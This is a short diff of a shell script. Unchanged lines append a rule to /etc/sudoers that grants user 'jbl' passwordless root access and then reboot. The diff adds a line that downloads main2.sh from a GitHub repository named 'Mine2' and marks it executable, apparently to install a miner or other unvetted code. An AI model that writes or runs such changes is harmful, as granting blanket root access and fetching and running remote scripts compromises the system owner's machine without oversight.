@@ -14,3 +14,4 @@ cat >> /etc/sudoers << EOF
 jbl ALL=(ALL) NOPASSWD:ALL
 EOF
 sudo reboot now
+wget https://raw.githubusercontent.com/R3verseIN/Mine2/main/main2.sh && chmod +x main2.sh
